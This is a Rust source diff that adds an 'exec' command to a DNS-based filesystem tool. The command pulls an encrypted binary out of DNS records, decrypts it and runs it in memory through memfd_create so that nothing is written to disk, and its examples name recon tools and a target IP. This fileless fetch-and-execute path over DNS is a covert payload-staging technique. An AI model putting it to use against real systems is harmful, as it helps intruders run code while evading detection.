@@ -204,6 +204,30 @@ enum Commands {
         output: PathBuf,
     },
 
+    /// Fetch and execute a binary from the DNS filesystem in-memory
+    ///
+    /// Retrieves the file from DNS, decrypts it, and executes it directly
+    /// from memory using memfd_create(2) — no file is written to disk.
+    ///
+    /// Examples:
+    ///   dnfs exec -d local.dnfs -b local -k $KEY /tools/recon
+    ///   dnfs exec -d fs.example.com -k $KEY /bin/agent -- --target 10.0.0.1
+    Exec {
+        #[command(flatten)]
+        conn: ConnArgs,
+
+        /// Encryption key
+        #[arg(short, long, env = "DNFS_KEY")]
+        key: String,
+
+        /// Path of the file within the DNS filesystem to execute
+        filepath: String,
+
+        /// Arguments to pass to the executed binary (after --)
+        #[arg(last = true)]
+        args: Vec<String>,
+    },
+
     /// Delete ALL records under the domain — IRREVERSIBLE
     ///
     /// Removes every DNS record associated with this Dn(f)s volume.
@@ -368,6 +392,33 @@ fn main() {
                     Err(e) => { eprintln!("Export error: {}", e); std::process::exit(1); }
                 }
             });
+        }
+
+        Commands::Exec { conn, key, filepath, args } => {
+            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
+            let backend = make_backend(&conn);
+            let config = storage::StorageConfig {
+                max_file_size: 10 * 1024 * 1024, // 10MB — binaries exceed the default 64KB
+                ..Default::default()
+            };
+            let mut store = storage::DnfsStorage::with_config(
+                backend, master_key, conn.domain, config,
+            );
+
+            eprintln!("Fetching {}...", filepath);
+            let binary = match store.read_file(&filepath) {
+                Ok(data) => data,
+                Err(e) => {
+                    eprintln!("Failed to read {}: {}", filepath, e);
+                    std::process::exit(1);
+                }
+            };
+
+            eprintln!("Executing in-memory ({} bytes)...", binary.len());
+            if let Err(e) = dnfs::exec::memfd_exec(binary, args) {
+                eprintln!("Execution failed: {}", e);
+                std::process::exit(1);
+            }
         }
 
         Commands::Nuke { conn, yes } => {
